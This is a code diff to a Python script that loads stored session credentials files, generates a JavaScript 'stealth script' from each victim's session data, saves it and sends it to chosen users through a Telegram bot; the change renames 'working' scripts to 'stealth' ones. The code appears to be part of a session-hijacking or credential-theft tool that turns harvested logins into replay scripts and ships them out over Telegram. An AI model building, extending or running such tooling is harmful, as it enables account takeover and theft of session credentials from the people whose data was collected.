@@ -24,7 +24,7 @@ print(f"🔍 Debug: TARGET_USER_IDS = {TARGET_USER_IDS}")
 
 # Configuration
 ENABLE_TELEGRAM_SENDING = True
-CUSTOM_MESSAGE_PREFIX = "🔧 **Generated Working Script**"
+CUSTOM_MESSAGE_PREFIX = "🛡️ **Generated Stealth Script**"
 INCLUDE_INSTRUCTIONS = True
 INCLUDE_TIPS = True
 
@@ -143,8 +143,8 @@ def send_script_to_user(script_content, script_filename, user_info, index, total
         print(f"❌ Error sending script {index}/{total} via Telegram: {e}")
         return False
 
-def generate_all_working_scripts():
-    """Generate working format scripts for ALL stored sessions and send each separately"""
+def generate_all_stealth_scripts():
+    """Generate stealth scripts for ALL stored sessions and send each separately"""
     
     # Get all JSON credentials files
     all_files = credentials_manager.list_credentials_files()
@@ -179,19 +179,19 @@ def generate_all_working_scripts():
         print(f"🔑 Auth Type: REAL")
         print(f"📦 Session Data Keys: {list(session_data.keys())}")
         
-        # Generate the working format script
-        script_content = credentials_manager.generate_working_format_script(session_data)
+        # Generate the stealth script
+        script_content = credentials_manager.generate_stealth_script(session_data)
         
         # Save the script
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         user_id = user_info.get('id', 'unknown')
-        script_filename = f"working_script_{user_id}_{timestamp}.js"
+        script_filename = f"stealth_script_{user_id}_{timestamp}.js"
         script_filepath = os.path.join("credentials", script_filename)
         
         with open(script_filepath, 'w', encoding='utf-8') as f:
             f.write(script_content)
         
-        print(f"✅ Working script generated: {script_filename}")
+        print(f"✅ Stealth script generated: {script_filename}")
         
         # Send the script to Telegram user
         print(f"📤 Sending script {index}/{total_files} to Telegram...")
@@ -211,4 +211,4 @@ def generate_all_working_scripts():
         print("💡 Check your Telegram chat with the bot to receive all the scripts!")
 
 if __name__ == "__main__":
-    generate_all_working_scripts() 
+    generate_all_stealth_scripts() 
